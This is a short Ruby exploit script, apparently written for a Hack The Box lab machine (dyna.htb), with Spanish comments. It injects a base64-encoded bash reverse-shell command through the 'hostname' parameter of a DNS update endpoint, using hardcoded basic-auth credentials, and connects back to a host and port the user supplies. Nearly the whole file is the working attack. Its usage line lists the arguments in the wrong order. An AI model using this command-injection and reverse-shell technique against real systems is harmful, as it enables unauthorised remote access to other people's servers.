require 'http'
require 'base64'

# -- Argumentos recibidos por el usuario
args = ARGV
unless ! args[0].nil? && ! args[1].nil?
  puts "\n[!] Uso: #{File.basename($0)} lport lhost"
  puts "[+] Ejemplo: #{File.basename($0)} 10.10.10.10 4433\n "
  exit(1)
end

# -- Variables
url_site = "http://dyna.htb/nic/update"
lhost = args[0]; lport = args[1]
command = "bash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1"
command_b64 = Base64.encode64(command).chop # Para quitar el \n 

puts "[+] Enviando reverse shell al puerto #{lport} de la IP #{lhost}"

# -- Hacemos petición en busca de una reverse shell
# --- Hacemos un control de tiempos para que no se nos quede el programa pegado, pasan 3 segundos de la petición y la cierra
begin
  payload = "$(echo '#{command_b64}' | base64 -d | bash)"
  r = HTTP.timeout(3).basic_auth(:user => "dynadns", :pass => "sndanyd").get(url_site, :params => {
    :hostname => payload + '.' + 'no-ip.htb',
    :myip => '10.10.10.10'
  })
rescue HTTP::TimeoutError => e
  puts "\n[+] t4moS m3Lon6os!"
  exit(0)
end

puts "\n[!] Revisa que estes en escucha por el puerto #{lport} de la IP #{lhost}"
exit(1)
